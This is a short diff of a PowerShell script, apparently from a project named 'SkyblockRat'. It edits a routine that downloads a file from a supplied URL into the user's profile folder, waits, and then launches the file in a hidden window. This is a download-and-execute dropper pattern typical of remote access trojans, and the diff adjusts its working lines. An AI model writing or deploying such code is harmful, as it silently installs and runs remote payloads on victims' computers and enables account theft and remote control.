@@ -10,11 +10,11 @@ param (
     [string]$waittime
 )
 
-    $outpath = "C:\Users\$env:username\SkyblockRat-main"
+    $outpath = "C:\Users\$env:username\SkyblockRat-main\$filenamea"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $urltofile -OutFile $outpath
 
-    $args = "/filename C:\Users\$env:username\SkyblockRat-main"
+    $args = "/filename C:\Users\$env:username\SkyblockRat-main\$filenamea"
     
     Start-Sleep -seconds $waittime
     Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
